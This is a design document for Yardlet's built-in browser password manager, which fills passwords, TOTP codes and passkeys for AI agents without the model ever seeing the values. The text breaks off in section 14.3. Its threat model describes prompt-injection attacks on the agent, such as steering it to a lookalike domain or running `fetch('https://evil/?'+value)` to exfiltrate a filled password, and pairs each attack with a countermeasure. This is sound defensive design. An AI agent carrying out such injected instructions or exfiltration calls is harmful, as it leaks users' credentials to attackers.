# The vault: the password manager of the built-in browser

This document describes how Yardlet keeps sign-ins, two-factor codes, passkeys, addresses and cards for the built-in
browser, fills them for agents and for the person, and keeps their values away from the model. The person sees it as
"Passwords" (and "password manager" inside sentences); the code, the storage folder, the keychain service, the tool and
this document call it the vault.

Related documents: agent tools in [AGENT_BROWSER_TOOLS](AGENT_BROWSER_TOOLS.md), the browser host and passkeys in
[BROWSER_HOST](BROWSER_HOST.md) section 3, "Passkeys (WebAuthn)" and section 7, browser profiles per task in
[BROWSER_SESSION_ISOLATION](BROWSER_SESSION_ISOLATION.md), and the precedent for keeping secrets in the keychain in
[CONNECTORS](CONNECTORS.md) (`KeychainConnectorCredentialStore`).

## 0. Goals

Even while the person is away, on sites the person saved, the agent gets past sign-in (password, two-step verification
code, passkey) and carries on with the work. The agent never sees secrets. The model names only the item, and Yardlet
puts the value into the browser's input field directly.

This is a Yardlet-only feature. It turns on and off in Yardlet's settings and writes nothing to harness settings files,
conversation history or accounts. Like the other browser tools, the tool comes in only through `yardlet-mcp`, per
session.

## 1. Overview

The friction the person sees is that of ordinary password managers (new items default to "Always", matching by
registrable domain, no Touch ID to turn the vault on, raise an item's step or make a passkey, no notification on each
fill, auto-lock only on screen lock, a save bar when the person signs in, a key button beside the address field, and the
vault on by default). The safeguards the person does not see stay strict: the path that keeps values away from the
model, site binding and field kinds.

- **What is stored:** site passwords, TOTP secrets, passkeys Yardlet holds (used without the person), and, for the
  person only, addresses and payment cards (section 18). No API keys (section 4.1).
- **Where:** the macOS login keychain for secrets, `~/.yardlet/vault/` for the item list and the usage log. Keychain items
  open only to Yardlet's signature (the Developer ID team) and do not sync through iCloud. No 1Password or Bitwarden
  connection (section 4.2).
- **One tool:** `browser_fill_credential` (item name, input field reference, kind). The result has no values and says
  only which fields were filled on which site (section 5.1).
- **Leak paths:** `browser_evaluate` is refused on a document once a value is filled into it, until a navigation or a
  reload opens another document. Screenshots are refused on that document too, and every text result has used values
  scrubbed, as written and in their common encodings (section 5.3).
- **Person confirmation step:** per item, "Always (including while away)", "While unlocked" or "Every time (Touch ID)".
  New items default to "Always". A fill on a page where the agent ran its own scripts asks the person whatever the
  step (section 6).
- **Binding to sites:** the field must be in the tab's main frame, whose registrable domain (for `github.com`, also
  `www.github.com` and `gist.github.com`) must be one of the item's sites (section 6.2).
- **UI:** Settings → Passwords, the item sheet, a save bar when the person signs in, a key button beside the address
  field, code, setup and strong password bars, and "Add to Password Manager…" and "Make a Yardlet Passkey" in the page's
  right-click menu. No new shortcuts or explanatory text (section 8).
- **Turning off and removing:** turning it off drops the tool from the list and refuses calls. "Delete all passwords…"
  deletes keychain items, the usage log and virtual authenticators too (section 9).

## 3. Non-goals

- No tool that shows secrets to the agent (reading a value, copying it to the clipboard).
- Nothing is written to harness settings files, conversation history or skill folders. A password manager MCP server or
  CLI that the user connected to a harness directly stays owned by the harness.
- No quiet reading of iCloud Keychain, Apple Passwords or Chrome passwords. Import works only from a CSV or an
  authenticator app's export QR code the person exported (sections 8.1 and 14.3).
- No layer that classifies what a page action means (a payment, a post) and blocks it: what follows a sign-in is the
  harness's approvals and permission modes (section 7).
- Existing Touch ID profile passkeys are left alone. A Yardlet passkey is a separate passkey newly registered on the
  site.
- No agent fills or reads a payment card or an address: the vault keeps them for the person's own fills only
  (section 18). Account creation is in scope only for its password: Yardlet makes a strong password for a new account
  and saves it (section 15; why agents may ask for one is in section 15.3). Other sign-up fields are the agent's
  ordinary typing.

## 4. What to store and where

### 4.1 What to store

| Kind | Handled | Reason |
|---|---|---|
| Site usernames and passwords | Yes | The most common place work stops. A username is not a secret but lives in the same item, with the form's other fields beside it (section 17) |
| TOTP secrets (RFC 6238, 30 seconds and 6 digits by default, SHA-1/256/512) | Yes | Yardlet generates each code when needed and fills it. Keeping passwords and TOTP in one vault has a cost: within that vault, two factors shrink to one (the same trade-off as 1Password and Bitwarden; section 14.5). Accepted, since the goal is use without the person |
| Passkeys used without the person (Yardlet keeps the private key) | Yes | Registered and used through the CDP `WebAuthn` virtual authenticator (section 5.2). It is a software key, weaker than a device-bound Touch ID passkey, so the person registers it on the site as a separate passkey named "Yardlet" that can be deleted on the site on its own |
| API keys and tokens | No | Put into the agent's shell, they end up in the conversation history through `echo`, and there is no way to scrub them from tool output the harness records (provider history is not edited). A proxy that attaches them to outgoing requests (the Infisical Agent Vault approach) needs TLS interception and an installed certificate, which leave traces after removal. These are left to connector OAuth and the user's existing tools (`op run` and others) |
| Addresses and payment cards | For the person only | Saved and filled from the panel's bars; no agent tool gives or fills one, and a card's security code is never kept (section 18) |
| Email and text message verification codes | No | Not a secret to store. The agent can read mail through the Gmail connector, and those codes live briefly. Push approval (Microsoft, Okta and Google prompts) is also an approval on the phone, so the vault cannot replace it (section 14.6) |

### 4.2 Storage locations compared

Secrets are kept only in the macOS login keychain, as connector tokens are: items open without the person only to
Yardlet's signature, Yardlet computes TOTP codes itself, a passkey signs by loading its private key into the virtual
authenticator, and there is nothing to install. The vault holds only the items the person added, a small delegation
list. Yardlet does not open a 1Password (`op`) or Bitwarden (`bw`) vault: without the person they need a service account
token or a session key that Yardlet would keep in the keychain anyway, they cannot sign with a passkey, and a whole
personal vault would give an injected agent a wide range to misuse. Backup is the login keychain file in Time Machine;
there is no sync. The store sits behind an engine-side protocol (`VaultSecretStoring`; the keychain store is
`KeychainVaultSecretStore`, and tests and QA runs use an in-memory one), so another store could sit under the same
protocol.

### 4.3 Keychain layout

- Secrets: a generic password item in the login keychain, service `<bundle ID>.vault`, account set to the item UUID,
  value in JSON (username, password, the last five passwords it replaced with when each was replaced, TOTP parameters,
  and for passkeys the credential ID, RP ID, user handle, PKCS#8 private key and signature count). The label is
  "Yardlet vault item" without the site name (so sites do not show in the Keychain Access list).
- Access: items Yardlet creates trust the designated requirement of the app that created them. The installed app is
  Developer ID signed and its requirement includes a team certificate condition (`codesign -d -r-` shows it), so
  another program signed with the same identifier cannot read them without a permission dialog. An ad-hoc development build's requirement is only the identifier, which any program of the same user could imitate, so
  **the vault turns on only in team-signed builds** (`MacVault.isTeamSigned`; Settings shows the switch off and says
  so in other builds). A vault QA run (`--ui-fixture-browser-check-only=vault` or `YARDLET_VAULT_QA=1`, debug builds
  only) keeps its items in memory instead, and a QA bundle's own identifier keeps its keychain items apart.
- Each secret also keeps the item's sites and agent policy as Yardlet saved them, so a change made to `items.json`
  outside Yardlet is caught (section 5.3).
- The person's addresses and cards are one more item of the same service, account `wallet` (section 18). Whether the
  person turned off "Hide keys and tokens" is an item of its own service (`<bundle ID>.vault.settings`), which emptying
  the vault leaves ([AGENT_BROWSER_TOOLS](AGENT_BROWSER_TOOLS.md)).
- What is not secret (name, sites, username and the form's other fields, step, creation date, last use) goes in
  `~/.yardlet/vault/items.json`, like Yardlet's other storage (folder 0700, files 0600). Drawing the settings list does
  not open the keychain. An `items.json` this build cannot read (damaged, or written by a later Yardlet) is not an
  empty vault: it is copied to `items-unreadable-<time>.json` beside it before a save replaces it, and the main window
  names the file. It names a save that failed too, until a later one succeeds.
- The usage log is `~/.yardlet/vault/usage.jsonl` (no values, kept for 90 days).
- The Public Suffix List (`public_suffix_list.dat`, MPL 2.0) is bundled and read from the app's own Resources the first
  time it is needed, so it updates only with app updates.
- The data protection keychain (`kSecUseDataProtectionKeychain`) and keychain access control flags are not used, because
  they need a `keychain-access-groups` entitlement and a provisioning profile on the app itself. "Every time" is an
  app-side gate that confirms the person with LocalAuthentication before reading.

## 5. Paths that keep values away from the model

### 5.1 Tools

One tool is added: `browser_fill_credential`. Its description says what it does and that a page asking to sign in or
for a code goes to it before the person (section 19).

| Argument | Meaning |
|---|---|
| `ref` | The input field reference from the last snapshot. For a sign-in, Yardlet finds the username field and the password field of the form that field belongs to |
| `item` | Item name, username or another of the item's field values, such as an account ID (optional; section 17). If empty, the item matching this tab's origin is used when there is exactly one; of several, the one the page's account, the task's last fill on this host or this very host points to (section 19), else an error with a list of "name (username)". Only the site's items that have what `kind` asks for (a password, a code, a passkey) are weighed, unless none has it, since a site's password and its two-factor code are often two items (section 14.3). Items with the same name, which import names after the site, are also picked by username |
| `kind` | `login` (default, username and password), `one_time_code` (TOTP), `passkey` (briefly prepares the virtual authenticator on this tab), `new_password` (a password Yardlet makes for a sign-up form, saved as a new item, section 15) |
| `submit` | Whether to submit the form after filling (optional): a safe form is submitted unless it is false (section 5.2) |
| `tabId` | Same as in the other page tools |

The result is one sentence without values. For example: "Filled the username and password of “GitHub (work)” into the
form on github.com and submitted it. The values are not shown to you." It does not mention the value's length or first
characters either. A refusal returns `isError` with the reason (origin mismatch, step, document rule, field kind). There
is no separate tool that lists items. With no matching item, it answers "No item is saved for <host>." and says what to
do next (section 19.2).

### 5.2 How filling works

With "Keep cookies" set to "Per task", a fill on a site the vault has an item for (or a `new_password` fill), in a task
that does not yet have a browser profile of its own, first gives the task one (a copy of the default profile's cookies)
and opens its tabs again there, so the agent's sign-in changes no other task's (`BrowserTaskProfiles.takeOwnProfile`;
[BROWSER_SESSION_ISOLATION](BROWSER_SESSION_ISOLATION.md) section 3). That call fills nothing and says to take a
new snapshot and call again; the steps below run on the next call. With "Shared by all tasks" this step is skipped.

1. **Origin check:** the vault fills only fields of the tab's main frame document. A field inside any frame (one from
   another site, or a frame of the page's own process, whose node's `ownerDocument` is not the main document) is
   refused. The origin is the main frame's `securityOrigin` from CDP `Page.getFrameTree`, a value the page cannot
   change; no URL from the model is used.
2. **Step check:** the step from section 6.1, the vault's lock state, and Touch ID if needed. A fill on a page where
   the agent ran its own scripts asks the person whatever the step (section 5.3).
3. **Field kind check:** a password goes only into `input[type=password]`. A username goes only into a text or email
   field of the same form (`autocomplete=username` first), and TOTP only into a text, number or tel field that has
   `autocomplete=one-time-code`, or that nothing marks as another field and that has a name or label meaning a code, a
   maximum length of 10 or less, numeric input, or a page asking for a code around it (section 14.3). A code split into
   one-character fields is spread over the consecutive fields. This blocks injection that tries to put the password into
   a public text field on the same site (a comment, a bio).
4. **Destination check:** before a password or a code goes in, the field's form must send its fields only to the
   item's own sites over https (the form's `action` and every submit button's `formaction`, by the rules of section
   6.2; a `javascript:` action sends nothing). A form that sends them anywhere else is not filled, and the refusal
   names where it sends them. See "Filled values and addresses" below.
5. **Filling:** in an isolated world only Yardlet uses (`Page.createIsolatedWorld`), Yardlet takes the node, sets the
   value with the native `value` setter, then dispatches `input` and `change` events (the way password manager
   extensions do it). The node object is bound to that document, so if the page changes in between, the fill fails
   instead of landing somewhere else. Plain forms and fields that hold their value React-style accept this
   ([BROWSER_HOST](BROWSER_HOST.md) section 3, "Vault"); there is no `Input.insertText` fallback.
6. **Record:** the tab records the filled document and nodes before the values go in, and a usage log entry is made
   (section 6.3).
7. **Submit:** a safe form, one whose every way of sending (its action and each submit button's) goes to the page's
   own origin over https (or to the local development server the page is on), and by POST when it holds a password, is
   submitted right after the fill unless `submit` is false, so the values stay on the page as briefly as they can, as
   1Password's agent autofill fills and submits. Submitting is a click on the form's submit button in the same isolated
   world (`requestSubmit()` when it has none). A form that would send a password by GET (which is also what a form
   without `method="post"` does) or a secret to another origin is filled and left unsent whatever `submit` says, and the
   result says why: the agent clicks the page's own button, whose script usually sends it another way. A one-time code
   may go by GET, since it is spent once sent. A field in no form gets Enter only with `submit: true`.

**Passkeys (`kind: passkey`):** Yardlet attaches a CDP virtual authenticator to this tab (`WebAuthn.enable`,
`WebAuthn.addVirtualAuthenticator`: ctap2, transport `internal`, with resident key and user verification, automatic
presence simulation), and adds that one credential (`WebAuthn.addCredential`) only when the item's RP ID matches the
tab's origin under WebAuthn rules. It signs the next request within 60 seconds, once (`WebAuthn.credentialAsserted`),
then removes the authenticator right away (`removeVirtualAuthenticator`, `disable`) and updates the signature count in
the keychain. While it is attached, that tab's Touch ID and phone passkeys cannot be used, so it is attached only
briefly. **Registration** happens while the person is present: after right-click "Make a Yardlet Passkey" (an empty
virtual authenticator on this tab for 2 minutes, https sites only, no Touch ID since the person clicked the menu), when
the person clicks the site's "Add a passkey", the credential received through `WebAuthn.credentialAdded` (with the
private key from `getCredentials`) goes into the keychain and the authenticator is removed. If the site has one item,
the passkey is added to it; with none or several, a new item named after the site is made. The virtual authenticator's attestation is "none", so enterprise sites that require an
attestation certificate do not accept it. The backup eligible (BE) flag is off.

Agent tools do not expose raw CDP, so the private key from `WebAuthn.getCredentials` has no path into a tool result.
`browser_evaluate` is page JS and cannot call CDP.

### 5.3 How values could leak and how each way is blocked

| Path | How it is blocked |
|---|---|
| Tool arguments (text the model writes) | The model does not know the value. The arguments are only the item name and a reference |
| Tool results | No value or length is written (section 5.1) |
| Reading the field value with `browser_evaluate`, or `fetch` to the outside | Refused on the document the value was filled into, whether or not the field still holds it, and in the tabs linked to that tab by `window.opener` (one opened the other, directly or through other tabs, also ones that have closed since) while it shows the document. It lifts when the tab goes to another document (a main frame navigation or a reload); an SPA that keeps its document after signing in needs a reload first, which the refusal says. The same holds whoever filled: the agent's tool, or the person's key button, code bar and strong password bar (section 15), which are recorded with the tab before the values go in. A page where the person typed into a password field in the panel, and a page the vault saw showing a two-factor setup (its QR code or `otpauth://` link), count as filled too, and so does a page where a card went in (section 18). Only passwords, codes and card values count:
a username is no secret, so a first sign-in step that filled only the username leaves `browser_evaluate` working and
the username unmasked in screenshots. When a script the agent ran (`browser_evaluate`) may still reach the document, the fill asks the person first whatever the item's policy, and fills nothing without them: it ran on the document or in a tab linked to it, or the document loaded later in a tab linked to one it may reach. The refusal tells the agent to close the other linked tabs, reload and fill without scripts. The ordinary flow, a fill without scripts first, does not ask |
| `browser_snapshot` (accessibility tree) | Blink replaces a password field's accessibility value with • of the same length (`IsPasswordFieldAndShouldHideValue`; [BROWSER_HOST](BROWSER_HOST.md) section 3, "Vault"). Yardlet replaces that value with `<redacted>` too, so the length does not show (the same marker as Codex's browser service uses). This rule always applies, vault or not. On a filled document, the fields that took a value and the innermost elements whose text shows one (a code drawn in boxes of the page's own) read as `<redacted>` by node, with nothing of what is in them, so a code split over one-digit boxes does not show; when Yardlet cannot tell which those are, the snapshot is refused. Values are scrubbed from each name and value before a long one is cut. As a backstop, "scrubbing matching strings" below covers everything else |
| `browser_screenshot` | Refused on a filled document, for as long as `browser_evaluate` is: a page can draw a value again in ways no cover of the filled fields reaches (a field of its own, a canvas, a code in boxes). While the vault is on, a screenshot that shows a two-factor setup QR code is not handed over; its key is scrubbed from results and the page counts as filled. The element picker's picture, which the person attaches, hides typed values and is left out when they cannot be hidden |
| `browser_console_messages` | Messages that a filled document logged are left out, and the result says how many |
| Every text result (snapshot, page address and title, `browser_wait_for`, console, JS dialog text, tab list, errors, notes at the end of a result) | **Scrubbing matching strings:** a value filled in the last 30 minutes is replaced with `[saved value]` (the same convention as GitHub Actions secret masking): as written, escaped in JSON, in base64 or hex, and each of these percent-encoded once or twice in either case, with `+` or `%2B` for a space. A password the person typed into a sign-in form they submitted in a task's tab is scrubbed the same way. This happens in the one place where `BrowserAgentTools.run` collects results. The values are only in memory and are discarded after 30 minutes |
| Addresses the page opens | See "Filled values and addresses" below: the browser host refuses the navigation before anything is sent |
| What Yardlet keeps of pages | A tab does not remember an address or title that carries a filled value: the task's saved tabs, a closed tab to reopen and the tabs reopened after the browser host ended keep the page before it, and the address field's history does not count it as a visit |
| Harness conversation history | If the above holds, values have no path into the history. Provider history is not edited |
| Yardlet and host logs | CDP messages are not logged (even now the DEBUG host writes only a dialog's ID and whether it was accepted). Fill commands carry a "sensitive" mark so future logs leave them out too, and the usage log has no values. The DEBUG raw accessibility dump (`accessibilityRecordPath`, QA only) runs only in QA homes where the vault is off |
| Clipboard | Agents get no tool that copies a value. A code the person copies in Settings → Passwords or chooses from the key button's list on a page with no code field (section 16), and a shown password or setup key the person copies out of the item sheet, are marked `org.nspasteboard.ConcealedType` and cleared after 90 seconds unless something else was copied since (1Password's default); Universal Clipboard still carries them to the person's devices. The agent's paste key does not paste a clipboard marked concealed. Any process of the person's can still read the clipboard during those 90 seconds |
| Chromium autofill and session restore | Password fields are left out of Blink's form state saving, and the host turns off Chrome's address and card autofill (which also stops form history) and Chrome's password saving (`credentials_enable_service`, `credentials_enable_autosignin`) in every profile, so usernames and code digits the person or the vault enters are not kept in form history. Entries a profile kept before the setting are left in place |
| `items.json` | The item list is a plain file any process of the person's can write. Each secret in the keychain keeps the item's sites and agent policy as Yardlet saved them; a fill (the agent's or the key button's) of an item whose `items.json` entry differs is refused and the person is notified ("A password item changed outside Yardlet") to open the item in Settings → Passwords and save it again. A secret that does not yet keep them takes the item's values at its first use |
| `browser_press_key` editing commands | Paste (`Meta+V`) is refused while the clipboard is marked concealed |
| The site's own scripts | Not blocked. The point is to give that site the password, so the exposure is the same as with every password manager. Instead, filling is bound to the registrable domain |

### 5.4 Filled values and addresses

When the vault fills a password into a page, for an agent or for the person, Yardlet first tells the browser host the
password's spellings (section 5.3, `guardFilledValues`). Until the tab's main frame starts another document, the host
refuses, before the request is sent (CEF `OnBeforeBrowse`, and a page's request for a new window), any navigation of the
tab, in any frame and including a redirect, whose address carries the password, as written or percent-encoded once or
twice, with or without `+` for a space. A form's body is not looked at there: CEF does not give `OnBeforeBrowse` a
navigation's body. Where a form sends a password is checked before the fill instead (section 5.2, step 4).

The host says only that it refused (`filledValueBlocked`), never the address. The panel shows a notice above the page, and
the agent's next result on that tab says what happened and what to do. One-time codes are scrubbed from results but do
not hold navigations: they expire in seconds, and a site that sends one in its address would otherwise not sign in.

Yardlet also keeps such an address out of what it remembers (section 5.3). Addresses that a build without these rules
kept are removed once as Yardlet starts (`BrowserFilledValueCleanup`), in a team-signed build that can read the vault's
items: from Chromium's history and icons in each profile and its URL-keyed metrics, and from each task's saved browser
tabs (such a page keeps its site and path and loses its title) and the address field's history. Only an entry whose address carries a vault password
whole, as a query or fragment value, a path segment, or inside an address in a parameter, goes, and nothing is backed
up. A store the browser host holds open is tried again at the next start.

A page's own scripts can still send what they read from a field elsewhere: with `fetch` or another request that is not
a navigation, or by pointing its form at another site after the fill. That is the site's own code (the last row of
section 5.3).

## 6. Policy while the person is away

### 6.1 Person confirmation step (per item)

| Step | When filling | Use |
|---|---|---|
| Always (default, including while away) | Does not ask, unless the agent ran its own scripts on the page (below) | As ordinary password managers default to. Sites added to the vault carry on without the person right away |
| While unlocked | Does not ask if the vault is unlocked. If it is locked, asks for Touch ID once, then not again until it locks; the scripts rule below still asks | For sites where work should stop while the person is away |
| Every time | Touch ID on every fill (the login password if there is no Touch ID). Refused if there is no answer within 2 minutes; while waiting, a notification "Waiting for you to sign in" ("‘Task’ is waiting to sign in to github.com with “GitHub”.") | As 1Password's agentic autofill asks. For accounts the person wants to see every time, such as a bank or a company admin account |

- Whatever the step, the harness's tool approval sits above it. In a task at a level that asks, Claude Code or Codex
  asks about the `browser_fill_credential` call first.
- Whatever the step, a fill on a page where a script the agent ran (`browser_evaluate`) may still reach the document asks
  the person with Touch ID first, with the same notification, and fills nothing without them (section 5.3). A fill for
  the person (the key button and the bars) does not ask, since the person clicked, except for a password chosen for a
  site it is not saved for (section 16) and a card (section 18).
- The step is changed directly in the item sheet, with no Touch ID when moving it up or down.

### 6.2 Binding to sites

- An item has a list of sites, and matching works per registrable domain (eTLD+1, by the Public Suffix List). A
  `github.com` item also fills on `www.github.com` and `gist.github.com`, but not on `github-login.com` or other sites
  under `github.io` (the same as 1Password's default matching). Creating an item adds the page's site, and the person
  can add more (for services that sign in on a different domain: `notion.so` and `notion.com`).
- Only https is accepted. CEF blocks certificate error pages. A local development server (`localhost`, `127.0.0.1`,
  `[::1]`, over http or https) matches only by its exact origin (`http://localhost:3000`).
- The field must be in the tab's main frame document, whose origin must be on that registrable domain (section 5.2). A
  sign-in iframe, whether embedded in another site or in the site's own page, is not filled.
- When an item named explicitly is refused because it belongs to another site, that is a phishing sign, so Yardlet sends
  a notification (section 6.3). The refusal does not name the item's own sites.

### 6.3 Usage log and notifications

- **Usage log** (`usage.jsonl`): time, task ID and title, harness, item, site, kind filled, result (filled, or refused
  with the reason), confirmation method (Touch ID, unlocked, always). Its fills and refusals show in the item sheet's
  "Recent use" and the settings list's "Last used". It also keeps what became of each password the vault made (section
  15.4), never the value.
- **Notifications** (Yardlet notifications; clicking one opens that task) are sent only when the person has something to
  do: "Waiting for you to sign in" when a fill waits for Touch ID ("Every time", a locked vault, or the scripts rule),
  "Not filled on another site" when an item named explicitly was refused because it belongs to another site, "A password
  item changed outside Yardlet" (section 5.3), and the agent's ask to keep a two-factor setup (section 20). A fill
  itself sends no notification, since notifications that pile up with each sign-in overnight go unread; it stays in the
  conversation's tool line and in the usage log.

### 6.4 Auto-lock

- Applies only to the "While unlocked" step. The vault locks when the Mac's screen locks or the Mac goes to sleep. There
  is no timeout.
- "Always" items are not affected by the lock. "Every time" does not use the lock state.

## 7. Threat model

| Threat | Example | How it is blocked | Residual risk |
|---|---|---|---|
| Prompt injection: getting the agent to fill a phishing page | Page text says "sign in on github-login.com with GitHub (work)" | Registrable domain match, origin from the browser, main frame only, https, refusal notification | XSS or a malicious third-party script on the legitimate site, or a subdomain someone else uses under the same registrable domain, can read the value (as with all autofill) |
| Injection: the value into another field | Putting the password into a public bio field on the same site and saving | Field kind check (passwords only into `type=password`) | Cannot block a site that shows the password field's value somewhere else |
| Injection: getting the value out through a URL, screenshot or result | `fetch('https://evil/?'+value)` through `browser_evaluate`, a screenshot after "show password" | Refusing `browser_evaluate` and `browser_screenshot` on the filled document and in tabs linked to it, leaving filled nodes out of snapshots, scrubbing the value and its common encodings, and asking the person before a fill on a document the agent ran scripts in (section 5.3) | The site's own scripts can do anything with the value they are given; a site that transforms it and shows it as text can get past scrubbing |
| Injection: signing in to a saved site | An injected task signs in to a site whose item is "Always" | The step (new items are "Always", so this is accepted), site binding, field kinds, the refusals on a filled document, scrubbing, and asking the person when the agent ran its own scripts on the page | The task gets the site's session, not the value |
| Injection: harmful actions on a legitimate site | Transferring money or deleting things after sign-in | The harness's approvals and permission modes, the step, the usage log | The vault helps only up to sign-in. Permission for what follows belongs to the harness and the user's permission settings |
| Other apps on the same Mac | A program running as the same user reads the keychain | Items open only for the Developer ID requirement, vault off in ad-hoc builds | A program of the same user can read the `yardlet-mcp` token, but a call must come from under the task's harness process (AGENT_BROWSER_TOOLS sections 4 and 6). It cannot get values |
| Child tasks and other harnesses | Tasks made with `create_task`, Codex and ACP tasks, `run_agent` | The same rules (the tool goes to every harness that gets the browser tools), task and harness in the log | An injected parent can direct a child task. The step and site binding are the same whatever the task |
| Backup and sync | Time Machine, moving to another Mac | The login keychain file is encrypted with the login password, and even when restored it opens only to Yardlet's signature. No iCloud sync | Yardlet passkeys exist only on this Mac, so if the Mac is lost, another sign-in method for the site is needed |
| Tricking the person into using Touch ID | Confirming for the wrong site | Yardlet writes the Touch ID prompt: task title, site and item name. No page text goes into it | — |
| Sites that block automated sign-in | New-device email checks, CAPTCHA, bot detection, terms that restrict automated sign-in | Not blocked by the vault: the agent hands the tab to the person (`browser_handoff`) | Which sites go into the vault is the person's call |
| A stale Public Suffix List | A new public suffix not yet in the bundled list | The list is bundled and updates with the app | Two sites under a new suffix may match each other until the app updates |

## 8. UI

### 8.1 Settings → Passwords

Settings has "Passwords" in its left list, right after Connectors (as Chrome keeps passwords inside settings).

```text
Passwords
  Password manager for agents                                        [Switch]
  [Search passwords]
  Two-factor codes                (while an item has one)
  Two-factor codes with no site   (while any is left)
  ───────────────────────────────────────────────
  GitHub (work)  ada     github.com · Password, code    Always        Yesterday   >
  Vercel                 vercel.com · Passkey           Always        3 days ago  >
  Hana Bank      ada     kebhana.com · Password         Every time    —           >
                                   [Import QR Code…]  [Import CSV…]  [+]
  Delete all passwords…
  Addresses and cards             (section 18)
```

- The switch is on by default. With no items at all, the tool is not added, so for someone who does not use it nothing
  changes.
- Rows: name and account (the username and the form's other fields, section 17), sites and kinds, step, last use.
  Clicking a row opens the item sheet.
- Above the items, "Two-factor codes" (section 14.3) and, while any is left, "Two-factor codes with no site": each with
  a suggested site to check, "Link" and "Link All" (section 14.3).
- Under the switch, a search field narrows all three lists to the items whose name, username or sites hold each word
  of the search, apart from case and accents, as the search of Chrome's password manager and the Passwords app does
  (section 16).
- CSV import takes the `name,url,username,password` shape that Chrome, 1Password and Bitwarden export, and their code
  columns (section 14.3). "Import QR Code…" reads authenticator app exports (section 14.3). Imported items also default
  to "Always". After an import, Yardlet asks whether to move the source files to the Trash, since they hold secrets in
  the clear.
- In a build that is not team-signed, the switch shows off and cannot be turned on ("Available in team-signed builds of
  Yardlet."; section 4.3).

### 8.2 Item sheet

Name, sites, username, password, previous passwords (when a password was replaced; shown after Touch ID, section 15),
two-factor setup key (`otpauth://` or the key), current code (seconds left and copy, section 14), agent use (three
steps), the form's other fields kept with the sign-in (section 17), recent use and delete. An item with only a two-factor
key is saved without a site or password (an authenticator app's entry, section 14). The password is a hidden field, and
"Show" works only after Touch ID (the same convention as the Chrome and Safari password screens). A passkey, if there is
one, shows only as "Passkey · made <date>", and it is not created here (section 8.3).

### 8.3 On a site

- **Save bar:** when the person submits a sign-in form in the panel (the password field holds a value the person
  typed, and then the page navigates or the form disappears; section 15.2 says what counts as sending), a bar above the
  page asks "Save the password for github.com? [Not for This Site] [Save] ×". If the password differs from an existing
  item, it asks to update it instead ("Update the saved password of dev for github.com?", section 17). Values the agent
  filled do not trigger it. The × closes the bar and remembers nothing; "Not for This Site" stops offers for the site.
  Detection is done by a listener in Yardlet's own isolated world, only on pages with a password field, and the value
  goes only to the Yardlet process (the same behavior as Chrome's save bubble; CEF has no such UI, so Yardlet draws it).
- **Key button beside the address field:** a key at the right of the address field, on any site's page while the vault
  holds any item (Chrome's key shows only on sites with saved passwords; Yardlet's also leads to the rest).
  Clicking it opens a list of that site's items over a search of every item (section 16): its sign-ins when the
  page's field is a sign-in's, its two-factor codes when it is a code field. Choosing one fills the current form for
  the person. A fill for the person happens right away whatever the step (the person clicked); only a
  password chosen for a site it is not saved for waits for Touch ID (section 16).
- **Page right-click menu** (the existing CEF menu → `NSMenu`): "Add to Password Manager…" (an item sheet with the
  current site and the typed username filled in) and "Make a Yardlet Passkey" (for 2 minutes, the next passkey
  registration on this tab goes into the vault, section 5.2; the person clicked the menu, so Touch ID is not asked).
- There is no autocomplete list attached under the field (the suggestion card of Chrome and other managers): it would
  have to be drawn over off-screen rendering, following the field's position. The key button and the bars do the same
  job.
- **Two-step verification (section 14):** when a verification code field shows, the code bar "Fill the
  two-factor code from “GitHub”? [Not Now] [Fill Code ▾]", whose menu ends in "Choose Another Code…" (the key button's
  list of codes, section 16); when a setup QR shows, the setup bar "Save the two-factor code for github.com in
  “GitHub”? [Not Now] [Save]"; and right-click "Add Two-Factor Code from QR Code".
- **An item chosen for another site (section 16):** after an item the person chose from the key button's
  list fills a site it is not saved for, the bar "Also save example.com in “GitHub”? [Not Now] [Save]".
- A bar the watcher's report raises is for the document that reported: it shows only while the tab's main frame still
  shows that address, so a report a document sends as the tab leaves it raises nothing over the next page.
- **Addresses and cards (section 18):** save and fill bars for the person.
- **Strong passwords (section 15):** when an empty new password field takes the focus, the bar "Use a strong
  password for github.com? The password manager saves it. [Not Now] [Use Strong Password]"; on any password field,
  right-click "Use Strong Password".

### 8.4 When it is used

- The conversation shows the tool line just as the harness draws it (`browser_fill_credential`, item name).
- In the panel header, "Passwords" with a key appears in place of the "Agent" indicator for 4 seconds.
- The Touch ID dialog (system), and notifications when the person has something to do (section 6.3).

No new shortcuts, explanatory text or onboarding screens.

## 9. Turning it on and off, and removing it

- **Turning off** (switch): the tool drops out of the next tool list (`tools/watch` → the next turn for Claude Code, the
  next resume for other harnesses; see "Tool lists of running tasks" in [CONNECTORS](CONNECTORS.md)), the app refuses
  calls from the moment it is off, removes any attached virtual authenticator, and hides the bars, the key button and the
  vault's right-click items. Items stay in the keychain (turning off and removing are different, as with turning a connector off and
  disconnecting it). Scrubbing matching strings continues until the 30-minute window ends.
- **Delete all passwords…**: after a confirmation dialog, deletes every keychain item of service `<bundle ID>.vault`
  (`SecItemDelete`) except the addresses and cards, which have their own Delete All (section 18), deletes `items.json`
  and `usage.jsonl`, and removes the virtual authenticators from all tabs. At the end it shows the list of sites where a Yardlet passkey is registered, so the person can delete
  the passkey on those sites (Yardlet cannot delete the site-side registration).
- **Deleting an item**: that item's keychain entry and metadata. For a passkey, the same notice.
- **Effect on harnesses**: nothing is written to harness settings files. The conversation history keeps only the call
  line (item name), as with other MCP tools. No values.
- **If Yardlet is moved to the Trash**: the keychain items remain, like connector tokens. Running "Delete all
  passwords…" and "Delete All Addresses and Cards…" before removing Yardlet leaves nothing behind.

## 14. Two-step verification for the person: a built-in authenticator

The vault is also an authenticator app for the person, so a phone authenticator app (such as Google Authenticator) is not
needed for the sites whose keys it holds: it saves setup QR codes from the page, fills codes, shows and copies them, and
imports an authenticator app's export.

### 14.3 Rules

- **At sign-in:** when the panel's watcher script (in Yardlet's isolated world) sees a verification code field, it
  reports it, and if that site's item has a code, a code bar appears above the page (the same shape as the save bar).
  Clicking it fills the current code into the field. With several items, the person picks one from a menu. The key
  button fills the code when focus is in a code field, or when the page has only a code field and no sign-in fields; a
  sign-in with no code of its own gives the code of the page's one other item of its account, as an agent's fill does
  (below; section 16). The person clicked, so it fills whatever the step (section 6.1), as the key button does.
- **Deciding what is a code field:** one rule (`VaultPageScripts.codeFieldTests`) serves the agent's fill
  check, the person's key button and code bar, and the watcher. It follows Chrome's password manager (`kOneTimePwdRe`
  on a field's name and id) and Bitwarden (`TotpFieldNames`, and the weaker `AmbiguousTotpFieldNames`, on a field's
  attributes and labels), and reads labels and the page around the field as well:
  1. Only a text, number or tel `input`; `autocomplete=one-time-code` settles it.
